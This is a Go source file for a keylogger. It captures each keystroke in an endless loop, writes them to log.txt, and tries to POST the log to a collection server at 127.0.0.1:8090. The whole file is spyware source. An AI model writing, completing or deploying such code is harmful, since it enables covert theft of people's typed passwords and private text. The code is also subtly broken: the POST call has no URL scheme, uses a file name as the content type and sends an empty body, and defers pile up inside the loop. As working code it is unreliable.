package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"github.com/eiannone/keyboard"
)

func check(err error)() {
    if err != nil{
		fmt.Println(err)
        // os.Exit(1)
    }
}

func main() {

    // create the log file
    f, err := os.Create("log.txt")
    check(err)

    defer f.Close()

	// Setup infite loop so that it continusously run
	for true {
		// log the keystrokes to a file
		keyboard.Open()
		defer keyboard.Close()

		key, _, err := keyboard.GetSingleKey()
		fmt.Println(key)
		check(err)

		// write the key to the log file 
		f.WriteString(string(key))
		check(err)
		
		// send the log to a server
		resp, err := http.Post("127.0.0.1:8090", "log.txt", nil)
		check(err)

		defer resp.Body.Close()

		scanner := bufio.NewScanner(resp.Body)
		for i := 0; scanner.Scan() && i < 5; i++ {
			fmt.Println(scanner.Text())
		}

		if err := scanner.Err(); err != nil {
			panic(err)
		} 
	}
}

